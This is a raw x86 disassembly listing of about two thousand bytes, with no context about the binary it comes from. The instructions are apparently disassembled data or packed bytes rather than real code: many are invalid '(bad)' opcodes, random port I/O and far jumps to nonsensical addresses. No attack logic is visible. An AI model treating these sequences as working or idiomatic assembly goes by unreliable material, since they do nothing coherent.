  42f04e:	add    DWORD PTR [edx-0x3f393b44],esi
  42f054:	loope  0x42f02d
  42f056:	out    0xb2,al
  42f058:	icebp  
  42f059:	fcmove st,st(7)
  42f05b:	int3   
  42f05c:	rcl    al,1
  42f05e:	clc    
  42f05f:	ret    
  42f060:	cld    
  42f061:	mov    edi,0x1c2d4fe
  42f066:	rol    ebx,1
  42f068:	cld    
  42f069:	(bad)  
  42f06a:	jmp    0x42f06e
  42f06c:	ret    0xf1e0
  42f06f:	retf   0xcdc0
  42f072:	iret   
  42f073:	rcl    bl,cl
  42f075:	(bad)  
  42f076:	fcmove st,st(7)
  42f078:	mov    eax,0xbae9ebd4
  42f07d:	jmp    0xfac6:0xbebab7fc
  42f084:	(bad)  
  42f085:	jmp    0xfb06:0xded0ebbc
  42f08c:	add    ebx,esp
  42f08e:	enter  0xa8ec,0xe3
  42f092:	xlat   BYTE PTR ds:[ebx]
  42f093:	stos   DWORD PTR es:[edi],eax
  42f094:	int    0xc4
  42f096:	out    dx,al
  42f097:	in     al,0xe7
  42f099:	out    0xb7,al
  42f09b:	call   0xe937da5d
  42f0a0:	call   0xd317cfa8
  42f0a5:	(bad)  
  42f0a6:	xlat   BYTE PTR ds:[ebx]
  42f0a7:	(bad)  
  42f0a8:	(bad)  
  42f0aa:	out    0xc9,al
  42f0ac:	fucomi st,st(5)
  42f0ae:	(bad)  
  42f0b0:	mov    al,0xe8
  42f0b2:	shl    cl,0xcf
  42f0b5:	mov    cl,0xf9
  42f0b7:	mov    dh,0xe0
  42f0b9:	idiv   DWORD PTR [esi-0x24323301]
  42f0bf:	(bad)  
  42f0c0:	xlat   BYTE PTR ds:[ebx]
  42f0c1:	fst    st(4)
  42f0c3:	fidivr WORD PTR [ebp-0xafa2b0b]
  42f0c9:	jecxz  0x42f0c7
  42f0cb:	stc    
  42f0cc:	out    0xe2,al
  42f0ce:	jecxz  0x42f091
  42f0d0:	into   
  42f0d1:	scas   al,BYTE PTR es:[edi]
  42f0d2:	rol    bh,0xb0
  42f0d5:	ret    
  42f0d6:	in     al,dx
  42f0d7:	out    dx,al
  42f0d8:	(bad)
  42f0db:	repz shl dh,1
  42f0de:	out    dx,eax
  42f0df:	rcl    ch,1
  42f0e1:	cld    
  42f0e2:	aam    0xbb
  42f0e4:	(bad)
  42f0e7:	icebp  
  42f0e8:	std    
  42f0e9:	jecxz  0x42f0d5
  42f0eb:	(bad)  
  42f0ec:	fcmovnb st,st(4)
  42f0ee:	or     bl,al
  42f0f0:	jmp    0xe214da9e
  42f0f5:	mov    cl,0xee
  42f0f7:	scas   eax,DWORD PTR es:[edi]
  42f0f8:	not    ecx
  42f0fa:	aam    0xf6
  42f0fc:	mov    esi,0x1ddffe3
  42f101:	repz mov ebp,0x2bcff06
  42f107:	out    0xf7,eax
  42f109:	add    bl,bh
  42f10b:	out    0xe,al
  42f10d:	(bad)
  42f110:	(bad)  [esi-0x174d0d38]
  42f116:	jmp    0x42f0fd
  42f118:	out    dx,al
  42f119:	iret   
  42f11a:	cmc    
  42f11b:	mov    dh,0xec
  42f11d:	sar    DWORD PTR [ebx-0x12012f22],1
  42f123:	mov    esi,0xfddff705
  42f128:	add    BYTE PTR [esi],cl
  42f12a:	retf   
  42f12b:	dec    esi
  42f12d:	(bad)  
  42f12f:	mov    ecx,0xe4d2b6c1
  42f135:	mov    ch,0xf3
  42f137:	hlt    
  42f138:	(bad)  
  42f139:	in     eax,dx
  42f13a:	retf   0xd8f1
  42f13d:	stc    
  42f13e:	sti    
  42f13f:	mov    eax,0x5d9b5fb
  42f144:	stc    
  42f145:	idiv   edi
  42f147:	(bad)  
  42f149:	(bad)  
  42f14b:	out    dx,eax
  42f14c:	(bad)  
  42f14d:	jmp    0xe527ab43
  42f152:	(bad)  
  42f153:	test   eax,0xc5f1b6c8
  42f159:	stc    
  42f15a:	(bad)  
  42f15b:	mov    edx,0xfa03cfff
  42f160:	(bad)  
  42f162:	cld    
  42f163:	mov    edi,0xdcdbdcbc
  42f168:	out    0x7,eax
  42f16a:	retf   
  42f16b:	std    
  42f16c:	or     ah,cl
  42f16e:	icebp  
  42f16f:	ret    
  42f170:	(bad)  
  42f171:	into   
  42f172:	int3   
  42f173:	icebp  
  42f174:	mov    dl,0xe7
  42f176:	repnz xlat BYTE PTR ds:[ebx]
  42f178:	(bad)  
  42f179:	sar    DWORD PTR [ebx-0x2d4b4143],1
  42f17f:	(bad)  
  42f180:	mov    edx,0xe7c101f3
  42f185:	jmp    0x42f191
  42f187:	cli    
  42f188:	retf   0xe503
  42f18b:	or     BYTE PTR [eax],al
  42f18d:	retf   0xe60d
  42f190:	scas   eax,DWORD PTR es:[edi]
  42f191:	mov    cl,0xe9
  42f193:	(bad)  
  42f194:	in     al,dx
  42f195:	sar    cl,cl
  42f197:	rcr    cl,1
  42f199:	xbegin 0xef25e575
  42f19f:	(bad)  
  42f1a0:	fsub   st,st(2)
  42f1a2:	ret    0xdabf
  42f1a5:	cld    
  42f1a6:	lock or edi,eax
  42f1a9:	fld    QWORD PTR [edi]
  42f1ab:	fxch   st(4)
  42f1ad:	retf   0xb3e4
  42f1b0:	retf   0xd2ef
  42f1b3:	not    eax
  42f1b5:	xlat   BYTE PTR ds:[ebx]
  42f1b6:	mov    ch,0xda
  42f1b8:	(bad)  
  42f1b9:	out    0xfb,al
  42f1bb:	mov    ebp,0xd202ffcc
  42f1c0:	in     al,dx
  42f1c1:	hlt    
  42f1c2:	mov    ah,0xbf
  42f1c4:	cli    
  42f1c5:	in     eax,0xb8
  42f1c7:	cld    
  42f1c8:	jmp    0x42f1b1
  42f1ca:	out    0xc,al
  42f1cc:	dec    dh
  42f1ce:	pop    es
  42f1cf:	lds    ebp,FWORD PTR [ecx+ebp*4-0x1e521f4a]
  42f1d6:	cmc    
  42f1d7:	xlat   BYTE PTR ds:[ebx]
  42f1d8:	(bad)  
  42f1d9:	stc    
  42f1da:	leave  
  42f1db:	mov    edx,0xc8f4b1fe
  42f1e0:	not    eax
  42f1e2:	out    0xdf,eax
  42f1e4:	cmc    
  42f1e5:	out    0xf5,al
  42f1e7:	hlt    
  42f1e8:	out    0xdf,al
  42f1ea:	cmc    
  42f1eb:	jmp    0xe6b8:0xf3e80cd9
  42f1f2:	test   bh,0xb6
  42f1f5:	loopne 0x42f1c9
  42f1f7:	rcl    dl,cl
  42f1f9:	iret   
  42f1fa:	(bad)  
  42f1fc:	jmp    0x42f1f4
  42f1fe:	mov    ecx,0xc2bdf6f3
  42f203:	(bad)  
  42f204:	clc    
  42f205:	rol    DWORD PTR [edx],cl
  42f207:	xlat   BYTE PTR ds:[ebx]
  42f208:	aam    0xd5
  42f20a:	(bad)  
  42f20b:	into   
  42f20c:	add    eax,0xdfab0813
  42f211:	loop   0x42f205
  42f213:	ret    0xc5b2
  42f216:	int    0xaf
  42f218:	mov    al,0xba
  42f21a:	lods   al,BYTE PTR ds:[esi]
  42f21b:	cmc    
  42f21c:	clc    
  42f21d:	jmp    0x42f20e
  42f21f:	clc    
  42f220:	icebp  
  42f221:	in     al,dx
  42f222:	aam    0xda
  42f224:	mov    esp,0xc709f7bc
  42f229:	(bad)  
  42f22a:	fisttp WORD PTR [esi]
  42f22c:	(bad)  
  42f22d:	(bad)  
  42f22e:	out    dx,eax
  42f22f:	jecxz  0x42f20d
  42f231:	icebp  
  42f232:	retf   0xf1dd
  42f235:	repz jmp 0xca0be633
  42f23b:	(bad)  
  42f23c:	out    dx,eax
  42f23d:	aad    0xd9
  42f23f:	jmp    0xd73bb31e
  42f244:	loop   0x42f22b
  42f246:	fcos   
  42f248:	shl    dh,1
  42f24a:	or     ebx,ecx
  42f24c:	into   
  42f24d:	loopne 0x42f21d
  42f24f:	mov    edi,0xc7a4b0ce
  42f254:	into   
  42f255:	mov    dh,0xd3
  42f257:	loope  0x42f24e
  42f259:	mov    eax,0xdcefbff2
  42f25e:	(bad)  
  42f25f:	rcl    ebx,1
  42f261:	loopne 0x42f226
  42f263:	(bad)  
  42f264:	repnz fcmovnb st,st(1)
  42f267:	retf   0xdcd9
  42f26a:	fld    st(4)
  42f26c:	or     al,0xfa
  42f26e:	push   cs
  42f26f:	lds    esi,FWORD PTR [edx-0x1f3c4d17]
  42f275:	mov    dh,0xc9
  42f277:	mov    dl,0xfa
  42f279:	retf   
  42f27a:	jmp    0xe0e9:0xf4bff2b3
  42f281:	out    0xd4,eax
  42f283:	aam    0xd5
  42f285:	fxch   st(3)
  42f287:	loopne 0x42f24f
  42f289:	out    0xeb,eax
  42f28b:	pop    es
  42f28c:	out    0xfa,al
  42f28e:	in     al,0xb3
  42f290:	mov    esi,0xcdcde7c6
  42f295:	int3   
  42f296:	mov    ah,0xce
  42f298:	aam    0xca
  42f29a:	fcmovu st,st(5)
  42f29c:	cmc    
  42f29d:	aad    0xba
  42f29f:	icebp  
  42f2a0:	mov    edx,0xbc0102b9
  42f2a5:	add    eax,0xbfec7
  42f2aa:	stc    
  42f2ab:	(bad)  
  42f2ad:	(bad)  
  42f2af:	(bad)
  42f2b3:	jmp    0x42f2a2
  42f2b5:	mov    al,0xe0
  42f2b7:	mov    dl,0xd1
  42f2b9:	enter  0xdfd1,0xd5
  42f2bd:	mov    ch,0xdf
  42f2bf:	fdiv   QWORD PTR [esi-0x9f93934]
  42f2c5:	aam    0xf7
  42f2c7:	cmc    
  42f2c8:	dec    DWORD PTR [edx]
  42f2ca:	jecxz  0x42f2d1
  42f2cc:	add    ebx,esi
  42f2ce:	clc    
  42f2cf:	out    dx,eax
  42f2d0:	int3   
  42f2d1:	mov    ebp,0xcff4e8ac
  42f2d6:	not    ebp
  42f2d8:	mov    cl,0xb0
  42f2da:	sar    ah,1
  42f2dc:	add    edi,esp
  42f2de:	cmc    
  42f2df:	rol    BYTE PTR [edi],1
  42f2e1:	push   es
  42f2e2:	shl    ebx,1
  42f2e4:	hlt    
  42f2e5:	clc    
  42f2e6:	out    0xe7,al
  42f2e8:	(bad)  
  42f2e9:	jmp    0x941e0f4
  42f2ee:	in     eax,0xc1
  42f2f0:	loopne 0x42f2dd
  42f2f2:	int    0xef
  42f2f4:	repz aam 0xe7
  42f2f7:	mov    ecx,0xf4d8e6f3
  42f2fc:	mov    dh,0xb8
  42f2fe:	stc    
  42f2ff:	sar    BYTE PTR [edx-0x4123190f],cl
  42f305:	loop   0x42f2f1
  42f307:	clc    
  42f308:	loope  0x42f319
  42f30a:	push   es
  42f30b:	in     eax,0xb
  42f30d:	add    eax,0xf3b0b8cb
  42f312:	lods   al,BYTE PTR ds:[esi]
  42f313:	out    dx,al
  42f314:	mov    al,0xc1
  42f316:	in     al,dx
  42f317:	fdiv   DWORD PTR [edi+ebp*8-0x47272647]
  42f31e:	std    
  42f31f:	(bad)  
  42f321:	aad    0xf7
  42f323:	add    eax,eax
  42f325:	fld    DWORD PTR [esi]
  42f327:	xlat   BYTE PTR ds:[ebx]
  42f328:	ror    bl,1
  42f32a:	loope  0x42f2f5
  42f32c:	loope  0x42f338
  42f32e:	out    dx,al
  42f32f:	shl    cl,0xe3
  42f332:	ret    0xb4dd
  42f335:	in     eax,dx
  42f336:	jmp    0xd3fae9ea
  42f33b:	mov    ebp,0xcdf6e9f8
  42f340:	fcomip st,st(5)
  42f342:	pop    es
  42f343:	sti    
  42f344:	(bad)  
  42f346:	mov    DWORD PTR [ecx],0x10601e8
  42f34c:	loop   0x42f346
  42f34e:	loope  0x42f2fd
  42f350:	lods   eax,DWORD PTR ds:[esi]
  42f351:	mov    esi,0xc5c4f0c4
  42f356:	sti    
  42f357:	shl    ah,0xeb
  42f35a:	mov    dh,0xf2
  42f35c:	sti    
  42f35d:	hlt    
  42f35e:	mov    ah,0xe8
  42f360:	int3   
  42f361:	in     eax,dx
  42f362:	clc    
  42f363:	out    0xe7,al
  42f365:	(bad)  
  42f367:	loope  0x42f32b
  42f369:	loop   0x42f36f
  42f36b:	fsub   st,st(2)
  42f36d:	iret   
  42f36e:	or     eax,0xeec2aeb8
  42f373:	xlat   BYTE PTR ds:[ebx]
  42f374:	retf   
  42f375:	aam    0xe4
  42f377:	mov    dl,0xf7
  42f379:	jmp    0xd601b839
  42f37e:	rcl    dl,1
  42f380:	jecxz  0x42f385
  42f382:	stc    
  42f383:	rol    dh,cl
  42f385:	repnz rcr cl,1
  42f388:	sti    
  42f389:	rol    BYTE PTR [edi+eax*1],0xdc
  42f38d:	out    0xdc,eax
  42f38f:	retf   
  42f390:	lods   al,BYTE PTR ds:[esi]
  42f391:	mov    bl,0xde
  42f393:	imul   BYTE PTR [edx+ebp*8-0x2b4f32]
  42f39a:	mov    bh,0xc4
  42f39c:	(bad)  
  42f39e:	ror    edi,cl
  42f3a0:	mov    ebp,0x4ffc2d7
  42f3a5:	in     al,0xe6
  42f3a7:	or     ecx,ebx
  42f3a9:	leave  
  42f3aa:	add    al,BYTE PTR [ecx]
  42f3ac:	fcom   st(3)
  42f3ae:	enter  0xbdac,0xf6
  42f3b2:	repnz leave 
  42f3b4:	ror    ebx,0xda
  42f3b7:	mov    ecx,0xd1f7effa
  42f3bc:	repnz in al,dx
  42f3be:	(bad)  
  42f3bf:	rcr    ecx,cl
  42f3c1:	add    eax,esi
  42f3c3:	stc    
  42f3c4:	repnz loopne 0x42f3bf
  42f3c7:	loopne 0x42f3d0
  42f3c9:	out    dx,eax
  42f3ca:	push   cs
  42f3cb:	(bad)  
  42f3cd:	in     al,0xfc
  42f3cf:	stos   BYTE PTR es:[edi],al
  42f3d0:	mov    ebp,0xf6f4cff1
  42f3d5:	ret    0xecd7
  42f3d8:	sar    BYTE PTR [edi-0x2b2c050c],1
  42f3de:	mov    edi,0xd5dfe3f3
  42f3e3:	add    al,0xb
  42f3e5:	test   DWORD PTR ds:0xe7ca08d5,0xeb0fcedd
  42f3ef:	out    dx,eax
  42f3f0:	fdiv   st,st(2)
  42f3f2:	rcl    cl,cl
  42f3f4:	ror    al,0xcb
  42f3f7:	mov    dl,0xee
  42f3f9:	xlat   BYTE PTR ds:[ebx]
  42f3fa:	mov    esi,0xbed3d5b4
  42f3ff:	lock pop es
  42f401:	add    bh,ch
  42f403:	fcmovnbe st,st(2)
  42f405:	shl    cl,1
  42f407:	fstp   st(0)
  42f409:	iret   
  42f40a:	or     esi,esp
  42f40c:	out    dx,eax
  42f40d:	leave  
  42f40e:	push   cs
  42f40f:	into   
  42f410:	in     eax,dx
  42f411:	mov    bl,0xbe
  42f413:	jecxz  0x42f3c1
  42f415:	mov    bh,0xbb
  42f417:	scas   eax,DWORD PTR es:[edi]
  42f418:	mov    ch,0xd0
  42f41a:	mov    dh,0xea
  42f41c:	retf   
  42f41d:	mov    edi,0xdbc10303
  42f422:	stc    
  42f423:	icebp  
  42f424:	add    al,0xeb
  42f426:	push   es
  42f427:	ret    
  42f428:	jecxz  0x42f3ff
  42f42a:	cli    
  42f42b:	std    
  42f42c:	adc    ebp,edx
  42f42e:	retf   
  42f42f:	retf   
  42f430:	(bad)  
  42f431:	rol    ecx,cl
  42f433:	loopne 0x42f420
  42f435:	in     eax,0xd0
  42f437:	aad    0xf8
  42f439:	rcr    al,1
  42f43b:	in     al,0x3
  42f43d:	loop   0x42f43e
  42f43f:	shr    dh,1
  42f441:	xlat   BYTE PTR ds:[ebx]
  42f442:	(bad)  
  42f444:	aad    0xc7
  42f446:	or     DWORD PTR [eax],ecx
  42f448:	stc    
  42f449:	push   es
  42f44a:	push   es
  42f44b:	aam    0xe6
  42f44d:	clc    
  42f44e:	std    
  42f44f:	mov    ebp,0xe6dcafaa
  42f454:	call   0xe615b92b
  42f459:	repz mov dh,0xb7
  42f45c:	retf   
  42f45d:	rcl    al,cl
  42f45f:	test   ebx,0xd2db02ed
  42f465:	rol    DWORD PTR ds:0xcfdfeff5,1
  42f46b:	add    eax,0xc1fcec0f
  42f470:	ret    
  42f471:	test   al,0xd1
  42f473:	jecxz  0x42f466
  42f475:	shl    cl,0xd0
  42f478:	fcom   st(1)
  42f47a:	fxtract 
  42f47c:	mov    dl,0xf4
  42f47e:	jecxz  0x42f45c
  42f480:	mov    ebp,0xfdfbddcf
  42f485:	loop   0x42f45b
  42f487:	(bad)  
  42f488:	out    0xe4,eax
  42f48a:	fcmovnb st,st(5)
  42f48c:	loop   0x42f489
  42f48e:	icebp  
  42f48f:	in     eax,dx
  42f490:	fmul   st(5),st
  42f492:	lock out 0xd4,al
  42f495:	retf   0xd6ee
  42f498:	call   0xea34c18e
  42f49d:	out    dx,al
  42f49e:	fcom   st(6)
  42f4a0:	rcr    bl,0xc7
  42f4a3:	fst    st(7)
  42f4a5:	rol    BYTE PTR [ebx],cl
  42f4a7:	les    eax,FWORD PTR [ebx]
  42f4a9:	cld    
  42f4aa:	leave  
  42f4ab:	fcomp  st(3)
  42f4ad:	in     al,dx
  42f4ae:	or     ecx,ebp
  42f4b0:	jmp    0x42f461
  42f4b2:	loop   0x42f4a2
  42f4b4:	aad    0xc9
  42f4b6:	fcmovne st,st(0)
  42f4b8:	mov    cl,0xf8
  42f4ba:	in     eax,0xf2
  42f4bc:	rcl    esp,1
  42f4be:	(bad)  
  42f4c0:	loopne 0x42f4c2
  42f4c2:	mov    edi,0xe200bef9
  42f4c7:	add    eax,0xec0f050a
  42f4cc:	int    0xee
  42f4ce:	add    BYTE PTR [edx-0x49183d0d],ch
  42f4d4:	repnz lods eax,DWORD PTR ds:[esi]
  42f4d6:	mov    ebx,0xb6f6dbc1
  42f4db:	rcl    esi,1
  42f4dd:	std    
  42f4de:	mov    eax,0xdaccd2dc
  42f4e3:	int3   
  42f4e4:	repnz in eax,0xc3
  42f4e7:	xlat   BYTE PTR ds:[ebx]
  42f4e8:	mov    esi,0xcedae409
  42f4ed:	loopne 0x42f4f7
  42f4ef:	jmp    0xb3e1:0xe4c7b1e2
  42f4f6:	out    0xcb,eax
  42f4f8:	aad    0xff
  42f4fa:	mov    edx,0xb9babcf1
  42f4ff:	rcl    eax,0xd0
  42f502:	into   
  42f503:	rcr    dh,1
  42f505:	lock aam 0xc7
  42f508:	out    dx,eax
  42f509:	cld    
  42f50a:	add    cl,cl
  42f50c:	(bad)  
  42f50e:	push   cs
  42f50f:	scas   eax,DWORD PTR es:[edi]
  42f510:	jecxz  0x42f4f8
  42f512:	out    dx,eax
  42f513:	mov    bh,0xb1
  42f515:	shl    ah,cl
  42f517:	repnz in al,0xef
  42f51a:	in     eax,dx
  42f51b:	into   
  42f51c:	cmc    
  42f51d:	add    edi,ecx
  42f51f:	fadd   st(0),st
  42f521:	stc    
  42f522:	lock lock rcr ebx,cl
  42f526:	repnz (bad) 
  42f529:	call   0xfe25be04
  42f52e:	std    
  42f52f:	jmp    0xe929ccf8
  42f534:	hlt    
  42f535:	hlt    
  42f536:	lods   al,BYTE PTR ds:[esi]
  42f537:	jmp    0xcbd1:0xcbc6cdf9
  42f53e:	add    cl,ah
  42f540:	fcmovne st,st(6)
  42f542:	ret    
  42f543:	aad    0xb
  42f545:	jmp    0x42f521
  42f547:	call   0xc812d830
  42f54c:	in     eax,0x13
  42f54e:	enter  0xc1c0,0xc4
  42f552:	mov    bl,0xf2
  42f554:	loop   0x42f524
  42f556:	out    0xda,eax
  42f558:	rcl    edx,cl
  42f55a:	mov    edi,0xc3d3faee
  42f55f:	add    ebx,eax
  42f561:	xlat   BYTE PTR ds:[ebx]
  42f562:	xlat   BYTE PTR ds:[ebx]
  42f563:	push   es
  42f564:	add    al,BYTE PTR [eax]
  42f566:	in     al,0xdf
  42f568:	(bad)  
  42f569:	hlt    
  42f56a:	add    eax,0xdcec0fc3
  42f56f:	scas   eax,DWORD PTR es:[edi]
  42f570:	into   
  42f571:	les    edi,FWORD PTR [edx+ecx*8-0x49321229]
  42f578:	(bad)  
  42f579:	(bad)  
  42f57a:	mov    dh,0xd8
  42f57c:	rcr    cl,cl
  42f57e:	idiv   esi
  42f580:	mov    ecx,0xd2bfed01
  42f585:	icebp  
  42f586:	mov    esp,0xe5eac4f0
  42f58b:	aam    0xc4
  42f58d:	int3   
  42f58e:	or     cl,al
  42f590:	in     al,0xc1
  42f592:	mov    bh,0xe5
  42f594:	hlt    
  42f595:	test   ecx,0xf3d5eacb
  42f59b:	shl    ebx,cl
  42f59d:	mov    ecx,0xc2bfe3df
  42f5a2:	lock add eax,0xbdedbd5
  42f5a8:	fisttp QWORD PTR [esi]
  42f5aa:	paddusb mm7,mm6
  42f5ad:	rol    DWORD PTR [edx+eiz*8],cl
  42f5b0:	jmp    0x42f59f
  42f5b2:	jmp    0xdaea:0xb2b2f1dc
  42f5b9:	clc    
  42f5ba:	(bad)  
  42f5bb:	into   
  42f5bc:	leave  
  42f5bd:	icebp  
  42f5be:	mov    edi,0xd4e2f8c1
  42f5c3:	fidivr WORD PTR [esp+edi*8+0xbc0e1f8]
  42f5ca:	rcr    bl,0xff
  42f5cd:	int3   
  42f5ce:	(bad)  
  42f5d0:	stos   BYTE PTR es:[edi],al
  42f5d1:	scas   al,BYTE PTR es:[edi]
  42f5d2:	aad    0xcc
  42f5d4:	aad    0xe1
  42f5d6:	(bad)  
  42f5d7:	test   cl,0xf2
  42f5da:	mov    dh,0xd8
  42f5dc:	repz int3 
  42f5de:	aam    0xe9
  42f5e0:	fcmove st,st(7)
  42f5e2:	hlt    
  42f5e3:	fcmovnb st,st(3)
  42f5e5:	std    
  42f5e6:	aad    0xc0
  42f5e8:	cli    
  42f5e9:	std    
  42f5ea:	clc    
  42f5eb:	in     eax,0xde
  42f5ed:	jecxz  0x42f5b8
  42f5ef:	leave  
  42f5f0:	repz mov esp,0xe5cee2c1
  42f5f6:	(bad)
  42f5f9:	in     al,dx
  42f5fa:	(bad)
  42f5fd:	xlat   BYTE PTR ds:[ebx]
  42f5fe:	ret    
  42f5ff:	aam    0xcd
  42f601:	aam    0xf6
  42f603:	add    BYTE PTR [edx-0x10fb07fb],bh
  42f609:	leave  
  42f60a:	add    eax,0xcc0206fa
  42f60f:	out    0xf1,eax
  42f611:	lds    esi,FWORD PTR [eax-0x1b3a2b4e]
  42f617:	shr    bh,cl
  42f619:	shr    ebp,cl
  42f61b:	sar    DWORD PTR [edx+ebp*8-0xa2c4111],cl
  42f622:	(bad)  
  42f624:	icebp  
  42f625:	retf   
  42f626:	ret    0xcae2
  42f629:	out    dx,al
  42f62a:	inc    DWORD PTR [ecx]
  42f62c:	jmp    0xd6c0:0xcedecbdc
  42f633:	loop   0x42f607
  42f635:	xlat   BYTE PTR ds:[ebx]
  42f636:	rcl    dh,0xec
  42f639:	shr    esi,1
  42f63b:	rcr    esi,1
  42f63d:	add    dh,cl
  42f63f:	xlat   BYTE PTR ds:[ebx]
  42f640:	in     eax,dx
  42f641:	icebp  
  42f642:	push   es
  42f643:	mov    cl,0xe1
  42f646:	(bad)
  42f649:	add    al,0xeb
  42f64b:	fldz   
  42f64d:	or     DWORD PTR [edx],ecx
  42f64f:	repnz loope 0x42f63c
  42f652:	into   
  42f653:	(bad)  
  42f654:	repnz xlat BYTE PTR ds:[ebx]
  42f656:	cli    
  42f657:	test   edi,0xf7b5f2ad
  42f65d:	stc    
  42f65e:	stc    
  42f65f:	mov    edi,0xe4bff0f8
  42f664:	(bad)  
  42f665:	aam    0xa
  42f667:	loop   0x42f62b
  42f669:	out    0xe9,eax
  42f66b:	fdiv   st(5),st
  42f66d:	or     ecx,DWORD PTR [eax]
  42f66f:	ret    0xb0d1
  42f672:	mov    ebp,0xc5e7c0ca
  42f677:	(bad)  
  42f678:	in     eax,dx
  42f679:	out    dx,eax
  42f67a:	cmc    
  42f67b:	icebp  
  42f67c:	fidivr WORD PTR [edi-0x82824]
  42f682:	ret    0xddd1
  42f685:	add    al,0xca
  42f687:	leave  
  42f688:	(bad)  
  42f689:	aam    0xe7
  42f68b:	out    0xf9,eax
  42f68d:	(bad)  
  42f690:	mov    esp,0xcaf3ebce
  42f695:	repz (bad) 
  42f697:	retf   0xbae8
  42f69a:	icebp  
  42f69b:	mov    edi,0xd3ddced2
  42f6a0:	mov    esp,0xdcc3dd06
  42f6a5:	fdivr  st,st(0)
  42f6a7:	add    eax,ecx
  42f6a9:	hlt    
  42f6aa:	jmp    0xd2c0:0xcbc402ce
  42f6b1:	(bad)  
  42f6b2:	mov    cl,0xd5
  42f6b4:	mov    ch,0xe5
  42f6b6:	mov    cl,0xc7
  42f6b8:	clc    
  42f6b9:	cli    
  42f6ba:	lock lock (bad) 
  42f6bd:	in     eax,dx
  42f6be:	(bad)  
  42f6bf:	out    dx,eax
  42f6c0:	int    0xe7
  42f6c2:	hlt    
  42f6c3:	clc    
  42f6c4:	fcmovbe st,st(7)
  42f6c6:	stc    
  42f6c7:	or     dl,ch
  42f6c9:	add    ch,bh
  42f6cb:	fiadd  WORD PTR [ecx*8-0x4843111d]
  42f6d2:	jmp    0x42f6c4
  42f6d4:	mov    bl,0xc1
  42f6d6:	lock rcl ecx,0xd4
  42f6da:	fcmovnu st,st(3)
  42f6dc:	iret   
  42f6dd:	fsub   st(0),st
  42f6df:	call   0xfa42bee1
  42f6e4:	int3   
  42f6e5:	ret    
  42f6e6:	jmp    0xd4cb:0xcbc7e2d9
  42f6ed:	lds    edx,FWORD PTR [ebx]
  42f6ef:	shr    dh,cl
  42f6f1:	test   eax,0xf0c8b7f7
  42f6f6:	out    dx,al
  42f6f7:	mov    cl,0xfa
  42f6f9:	repz rcl edi,1
  42f6fc:	(bad)  
  42f6fd:	(bad)  
  42f6ff:	(bad)  
  42f700:	mov    ebp,0xe1ccc2d4
  42f705:	add    edi,edx
  42f707:	fld    DWORD PTR [ebx]
  42f709:	(bad)  
  42f70a:	retf   0xe904
  42f70d:	in     eax,dx
  42f70e:	or     ch,bl
  42f710:	rcl    ebx,cl
  42f712:	mov    bl,0xd0
  42f714:	repnz leave 
  42f716:	retf   
  42f717:	jmp    0xf8f6:0xfceac5ee
  42f71e:	clc    
  42f71f:	aad    0xbf
  42f721:	mov    ebp,0xc2daddf6
  42f726:	sar    edx,0xf7
  42f729:	out    0xf9,eax
  42f72b:	fdivr  st,st(7)
  42f72d:	fist   WORD PTR [edx]
  42f72f:	jmp    0x42f71a
  42f731:	jecxz  0x42f708
  42f733:	lock loope 0x42f707
  42f736:	icebp  
  42f737:	retf   0xfff0
  42f73a:	std    
  42f73b:	cld    
  42f73c:	mov    dh,0xe9
  42f73e:	fsub   st(7),st
  42f740:	cmc    
  42f741:	in     al,dx
  42f742:	mov    eax,0xe0e6d6e6
  42f747:	jmp    0x42f70b
  42f749:	out    dx,eax
  42f74a:	(bad)  
  42f74c:	in     eax,0xd3
  42f74e:	repnz mov edi,0xb0d1afb0
  42f754:	shr    ecx,cl
  42f756:	retf   
  42f757:	(bad)  
  42f759:	cmc    
  42f75a:	jmp    0x42f746
  42f75c:	ror    dl,1
  42f75e:	ret    
  42f75f:	fcos   
  42f761:	pop    es
  42f762:	add    eax,0xd5d1e2d6
  42f767:	(bad)  
  42f768:	sti    
  42f769:	add    bh,ah
  42f76b:	jecxz  0x42f748
  42f76d:	or     al,0xe5
  42f76f:	mov    ebp,0xd5d7a8ee
  42f774:	retf   0xe8c2
  42f777:	int3   
  42f778:	loopne 0x42f771
  42f77a:	into   
  42f77b:	mov    bl,0xb4
  42f77d:	mov    edx,0xc1f1e3fd
  42f782:	fsub   st,st(4)
  42f784:	jmp    0x42f78c
  42f786:	(bad)  
  42f787:	in     al,0xca
  42f789:	shl    cl,0xea
  42f78c:	(bad)
  42f78f:	int3   
  42f790:	mov    esi,0xd6cce8e8
  42f795:	repnz fcmovnu st,st(1)
  42f798:	shl    DWORD PTR [ebp-0x608374b],cl
  42f79e:	add    ecx,ebx
  42f7a0:	call   0xbf3ddaa7
  42f7a5:	fst    st(4)
  42f7a7:	fcmovnbe st,st(7)
  42f7a9:	std    
  42f7aa:	stc    
  42f7ab:	enter  0xdce1,0xcf
  42f7af:	in     al,dx
  42f7b0:	call   0xb131c662
  42f7b5:	retf   
  42f7b6:	sti    
  42f7b7:	out    dx,al
  42f7b8:	enter  0xefd6,0xff
  42f7bc:	(bad)  
  42f7be:	clc    
  42f7bf:	int    0xdc
  42f7c1:	shr    esp,cl
  42f7c3:	std    
  42f7c4:	jecxz  0x42f7c5
  42f7c6:	mov    esp,0xfdc1faf4
  42f7cb:	loope  0x42f7d7
  42f7cd:	push   cs
  42f7ce:	(bad)  
  42f7d0:	ret    
  42f7d1:	jmp    0x42f7c5
  42f7d3:	rcl    eax,1
  42f7d5:	(bad)
  42f7d8:	(bad)  
  42f7d9:	fdivp  st(5),st
  42f7db:	mov    bh,0xe4
  42f7dd:	clc    
  42f7de:	add    edi,DWORD PTR [esi-0xd4b3e38]
  42f7e4:	pop    es
  42f7e5:	push   es
  42f7e6:	(bad)  
  42f7e7:	sti    
  42f7e8:	mov    DWORD PTR [eax*1-0x19f91d25],0xf3ddcbab
  42f7f3:	jecxz  0x42f7eb
  42f7f5:	(bad)
  42f7f8:	into   
  42f7f9:	mov    eax,0xcaefbadd
  42f7fe:	xlat   BYTE PTR ds:[ebx]
  42f7ff:	ror    ch,1
  42f801:	loopne 0x42f7e1
  42f803:	inc    dh
  42f805:	test   DWORD PTR [edi],0xc8dfdbd9
  42f80b:	enter  0x5de,0xe4
  42f80f:	mov    esi,0xc9d7c2f7
  42f814:	mov    ch,0xcd
  42f816:	rcl    cl,0xf6
  42f819:	(bad)  
  42f81a:	mov    ebx,0xd8d4d4df
  42f81f:	sti    
  42f820:	out    0xbf,eax
  42f822:	xlat   BYTE PTR ds:[ebx]
  42f823:	(bad)
  42f826:	pop    es
  42f827:	shr    ecx,1
  42f829:	in     al,0xe3
  42f82b:	(bad)  
  42f82c:	fdiv   st(5),st
  42f82e:	or     dl,cl
